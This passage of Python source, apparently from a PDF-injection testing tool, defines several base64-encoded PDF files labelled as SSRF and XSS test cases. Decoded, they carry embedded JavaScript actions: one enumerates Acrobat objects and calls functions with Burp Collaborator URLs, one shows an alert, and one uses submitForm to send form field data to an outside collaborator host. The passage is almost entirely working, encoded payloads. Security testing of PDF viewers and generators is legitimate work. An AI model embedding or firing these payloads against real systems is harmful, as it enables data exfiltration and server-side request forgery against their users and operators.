MDAwMjY1NyAwMDAwMCBuIAowMDAwMDAyNzQzIDAwMDAwIG4gCnRyYWlsZXIKPDwKL1NpemUgMjEKL1Jvb3QgMjAgMCBSCi9JbmZvIDE5IDAgUgovSUQgWyA8M0NCOUQzOUNGRDA1RDFGNjRGOURFREU1MTM4MDZCMzM+IDwzQ0I5RDM5Q0ZEMDVEMUY2NEY5REVERTUxMzgwNkIzMz4gXQo+PgpzdGFydHhyZWYKMjg0NwolJUVPRg==')
    pdf_ssrf28_jspdf_acrobat_enumerator_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0NvbnRlbnRzIDQgMCBSCj4+CmVuZG9iago0IDAgb2JqCjw8Ci9MZW5ndGggMTI5Cj4+CnN0cmVhbQowLjU2NzAwMDAwMDAwMDAwMDEgdwowIEcKQlQKL0YxIDE2IFRmCjE4LjM5OTk5OTk5OTk5OTk5ODYgVEwKMCBnCjU2LjY5MjkxMzM4NTgyNjc3NzUgNzg1LjE5NzA4NjYxNDE3MzI1ODYgVGQKKEhlbGxvIHdvcmxkISkgVGoKRVQKZW5kc3RyZWFtCmVuZG9iago1IDAgb2JqCjw8L1R5cGUgL1BhZ2UKL1BhcmVudCAxIDAgUgovUmVzb3VyY2VzIDIgMCBSCi9NZWRpYUJveCBbMCAwIDQxOS41Mjk5OTk5OTk5OTk5NzI3IDI5Ny42Mzk5OTk5OTk5OTk5ODY0XQovQW5ub3RzIFsKPDwvVHlwZSAvQW5ub3QgL1N1YnR5cGUgL0xpbmsgL1JlY3QgWzAuIDI2OS4yOTM1NDMzMDcwODY2MjI1IDU2Ni45MjkxMzM4NTgyNjc3MzI2IC0yOTcuNjM1NTkwNTUxMTgxMTY3XSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC9ibGFoKT4+L0E8PC9TL0phdmFTY3JpcHQvSlMoCiAgICBvYmogPSB0aGlzOwogICAgZm9yKGkgaW4gb2JqKXsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZihpPT09J2NvbnNvbGUnIHx8IGkgPT09ICdnZXRVUkwnIHx8IGkgPT09ICdzdWJtaXRGb3JtJyl7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZih0eXBlb2Ygb2JqW2ldICE9ICdmdW5jdGlvbicpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUucHJpbnRsbihpKyc9JytvYmpbaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLnByaW50bG4oJ2NhbGw6JytpKyc9PicrJz0nK29ialtpXSgnaHR0cDovL3lvdXItaWQtJytpKycuYnVycGNvbGxhYm9yYXRvci5uZXQ/JytpLDIsMykpOwogICAgICAgICAgICB9Y2F0Y2goZSl7fQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZm9yKGogaW4gb2JqW2ldKSB7CiAgICAgICAgICAgICAgICAgICAgaWYoaj09PSdjb25zb2xlJyB8fCBqID09PSAnZ2V0VVJMJyB8fCBqID09PSAnc3VibWl0Rm9ybScpewogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYodHlwZW9mIG9ialtpXVtqXSAhPSAnZnVuY3Rpb24nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUucHJpbnRsbihpKyc9PicraisnPScrb2JqW2ldW2pdKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLnByaW50bG4oJ2NhbGw6JytpKyc9PicraisnPScrb2JqW2ldW2pdKCdodHRwOi8veW91ci1pZC0nK2orJy5idXJwY29sbGFib3JhdG9yLm5ldD8nK2osMiwzKSk7CiAgICAgICAgICAgICAgICAgICAgfWNhdGNoKGUpe30KICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IoayBpbiBvYmpbaV1bal0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGs9PT0nY29uc29sZScgfHwgayA9PT0gJ2dldFVSTCcgfHwgayA9PT0gJ3N1Ym1pdEZvcm0nKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUucHJpbnRsbihpKyc9PicraisnPT4nK2srJz0nK29ialtpXVtqXVtrXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLnByaW50bG4oJ2NhbGw6JytpKyc9PicraisnPT4nK2srJz0nK29ialtpXVtqXVtrXSgnaHR0cDovL3lvdXItaWQtJytrKycuYnVycGNvbGxhYm9yYXRvci5uZXQ/JytrLDIsMykpOyAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Y2F0Y2goZSl7fQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChlKXt9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH1jYXRjaChlKXt9CiAgICAgICAgfSBjYXRjaChlKXt9CiAgICB9CiAgICAKICAgICkvVHlwZS9BY3Rpb24vRiAwLygpID4+ID4+Cl0KL0NvbnRlbnRzIDYgMCBSCj4+CmVuZG9iago2IDAgb2JqCjw8Ci9MZW5ndGggMjQKPj4Kc3RyZWFtCjAuNTY3MDAwMDAwMDAwMDAwMSB3CjAgRwplbmRzdHJlYW0KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZSAvUGFnZXMKL0tpZHMgWzMgMCBSIDUgMCBSIF0KL0NvdW50IDIKPj4KZW5kb2JqCjcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXIKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTIgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTMgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTQgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtUm9tYW4KL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTYgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE3IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZEl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxOSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1phcGZEaW5nYmF0cwovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoyMCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1N5bWJvbAovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoyIDAgb2JqCjw8Ci9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXQovRm9udCA8PAovRjEgNyAwIFIKL0YyIDggMCBSCi9GMyA5IDAgUgovRjQgMTAgMCBSCi9GNSAxMSAwIFIKL0Y2IDEyIDAgUgovRjcgMTMgMCBSCi9GOCAxNCAwIFIKL0Y5IDE1IDAgUgovRjEwIDE2IDAgUgovRjExIDE3IDAgUgovRjEyIDE4IDAgUgovRjEzIDE5IDAgUgovRjE0IDIwIDAgUgo+PgovWE9iamVjdCA8PAo+Pgo+PgplbmRvYmoKMjEgMCBvYmoKPDwKL1Byb2R1Y2VyIChqc1BERiAyLjEuMSkKL0NyZWF0aW9uRGF0ZSAoRDoyMDIwMTEwNTEzNTIwMS0wMCcwMCcpCj4+CmVuZG9iagoyMiAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMSAwIFIKL09wZW5BY3Rpb24gWzMgMCBSIC9GaXRIIG51bGxdCi9QYWdlTGF5b3V0IC9PbmVDb2x1bW4KPj4KZW5kb2JqCnhyZWYKMCAyMwowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDIzNTAgMDAwMDAgbiAKMDAwMDAwNDE3NSAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDAxNTIgMDAwMDAgbiAKMDAwMDAwMDMzMiAwMDAwMCBuIAowMDAwMDAyMjc2IDAwMDAwIG4gCjAwMDAwMDI0MTMgMDAwMDAgbiAKMDAwMDAwMjUzOCAwMDAwMCBuIAowMDAwMDAyNjY4IDAwMDAwIG4gCjAwMDAwMDI4MDEgMDAwMDAgbiAKMDAwMDAwMjkzOSAwMDAwMCBuIAowMDAwMDAzMDYzIDAwMDAwIG4gCjAwMDAwMDMxOTIgMDAwMDAgbiAKMDAwMDAwMzMyNCAwMDAwMCBuIAowMDAwMDAzNDYwIDAwMDAwIG4gCjAwMDAwMDM1ODggMDAwMDAgbiAKMDAwMDAwMzcxNSAwMDAwMCBuIAowMDAwMDAzODQ0IDAwMDAwIG4gCjAwMDAwMDM5NzcgMDAwMDAgbiAKMDAwMDAwNDA3OSAwMDAwMCBuIAowMDAwMDA0NDI1IDAwMDAwIG4gCjAwMDAwMDQ1MTEgMDAwMDAgbiAKdHJhaWxlcgo8PAovU2l6ZSAyMwovUm9vdCAyMiAwIFIKL0luZm8gMjEgMCBSCi9JRCBbIDw1QUY2QzIyNDlFNTE1NDcwNzU1RDZBNDQ2RjkwMUIyMD4gPDVBRjZDMjI0OUU1MTU0NzA3NTVENkE0NDZGOTAxQjIwPiBdCj4+CnN0YXJ0eHJlZgo0NjE1CiUlRU9G')
    pdf_xss18_jspdf_hybrid_hybrid_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKCMpL1MvSmF2YVNjcmlwdC9KUyhhcHAuYWxlcnQoMSkpL1R5cGUvQWN0aW9uPj4gPj4gPDwvVHlwZS9Bbm5vdC9SZWN0WzAgMCA5MDAgNzAwXS9TdWJ0eXBlL1dpZGdldC9QYXJlbnQ8PC9GVC9CdG4vVChhKT4+L0E8PC9TL0phdmFTY3JpcHQvSlMoYXBwLmFsZXJ0KDEpKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDEyNgo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihUZXN0IHRleHQpIFRqCkVUCmVuZHN0cmVhbQplbmRvYmoKMSAwIG9iago8PC9UeXBlIC9QYWdlcwovS2lkcyBbMyAwIFIgXQovQ291bnQgMQo+PgplbmRvYmoKNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZE9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXIKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTAgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTEgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTIgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEzIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtUm9tYW4KL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTQgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZEl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1phcGZEaW5nYmF0cwovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1N5bWJvbAovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoyIDAgb2JqCjw8Ci9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXQovRm9udCA8PAovRjEgNSAwIFIKL0YyIDYgMCBSCi9GMyA3IDAgUgovRjQgOCAwIFIKL0Y1IDkgMCBSCi9GNiAxMCAwIFIKL0Y3IDExIDAgUgovRjggMTIgMCBSCi9GOSAxMyAwIFIKL0YxMCAxNCAwIFIKL0YxMSAxNSAwIFIKL0YxMiAxNiAwIFIKL0YxMyAxNyAwIFIKL0YxNCAxOCAwIFIKPj4KL1hPYmplY3QgPDwKPj4KPj4KZW5kb2JqCjE5IDAgb2JqCjw8Ci9Qcm9kdWNlciAoanNQREYgMi4xLjEpCi9DcmVhdGlvbkRhdGUgKEQ6MjAyMDEwMTYxMzIxMDcrMDEnMDAnKQo+PgplbmRvYmoKMjAgMCBvYmoKPDwKL1R5cGUgL0NhdGFsb2cKL1BhZ2VzIDEgMCBSCi9PcGVuQWN0aW9uIFszIDAgUiAvRml0SCBudWxsXQovUGFnZUxheW91dCAvT25lQ29sdW1uCj4+CmVuZG9iagp4cmVmCjAgMjEKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwNjM5IDAwMDAwIG4gCjAwMDAwMDI0NTYgMDAwMDAgbiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwNDYyIDAwMDAwIG4gCjAwMDAwMDA2OTYgMDAwMDAgbiAKMDAwMDAwMDgyMSAwMDAwMCBuIAowMDAwMDAwOTUxIDAwMDAwIG4gCjAwMDAwMDEwODQgMDAwMDAgbiAKMDAwMDAwMTIyMSAwMDAwMCBuIAowMDAwMDAxMzQ0IDAwMDAwIG4gCjAwMDAwMDE0NzMgMDAwMDAgbiAKMDAwMDAwMTYwNSAwMDAwMCBuIAowMDAwMDAxNzQxIDAwMDAwIG4gCjAwMDAwMDE4NjkgMDAwMDAgbiAKMDAwMDAwMTk5NiAwMDAwMCBuIAowMDAwMDAyMTI1IDAwMDAwIG4gCjAwMDAwMDIyNTggMDAwMDAgbiAKMDAwMDAwMjM2MCAwMDAwMCBuIAowMDAwMDAyNzA0IDAwMDAwIG4gCjAwMDAwMDI3OTAgMDAwMDAgbiAKdHJhaWxlcgo8PAovU2l6ZSAyMQovUm9vdCAyMCAwIFIKL0luZm8gMTkgMCBSCi9JRCBbIDwxMDEyNEUyQjVFNUVDOTJFMzVFQjNENEU2NjQ5RTUyOT4gPDEwMTI0RTJCNUU1RUM5MkUzNUVCM0Q0RTY2NDlFNTI5PiBdCj4+CnN0YXJ0eHJlZgoyODk0CiUlRU9G')
    pdf_ssrf29_jspdf_chrome_pdf_ssrf_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKCMpPj4+Pjw8L1R5cGUvQW5ub3QvUmVjdFsgMCAwIDkwMCA5MDBdL1N1YnR5cGUvV2lkZ2V0L1BhcmVudDw8L0ZUL1R4L1QoQWJjKS9WKGJsYWgpPj4vQTw8L1MvSmF2YVNjcmlwdC9KUygKYXBwLmFsZXJ0KDEpOwp0aGlzLnN1Ym1pdEZvcm0oJ2h0dHBzOi8vYWl3czR1NnV1YmdmZGFnOTR4dmM1d2JyZmlsYzkxLmJ1cnBjb2xsYWJvcmF0b3IubmV0JywgZmFsc2UsIGZhbHNlLCBbJ0FiYyddKTsKKS8oKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDEyNgo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihUZXN0IHRleHQpIFRqCkVUCmVuZHN0cmVhbQplbmRvYmoKMSAwIG9iago8PC9UeXBlIC9QYWdlcwovS2lkcyBbMyAwIFIgXQovQ291bnQgMQo+PgplbmRvYmoKNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZE9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXIKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTAgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTEgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTIgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEzIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtUm9tYW4KL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTQgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZEl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1phcGZEaW5nYmF0cwovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1N5bWJvbAovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoyIDAgb2JqCjw8Ci9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXQovRm9udCA8PAovRjEgNSAwIFIKL0YyIDYgMCBSCi9GMyA3IDAgUgovRjQgOCAwIFIKL0Y1IDkgMCBSCi9GNiAxMCAwIFIKL0Y3IDExIDAgUgovRjggMTIgMCBSCi9GOSAxMyAwIFIKL0YxMCAxNCAwIFIKL0YxMSAxNSAwIFIKL0YxMiAxNiAwIFIKL0YxMyAxNyAwIFIKL0YxNCAxOCAwIFIKPj4KL1hPYmplY3QgPDwKPj4KPj4KZW5kb2JqCjE5IDAgb2JqCjw8Ci9Qcm9kdW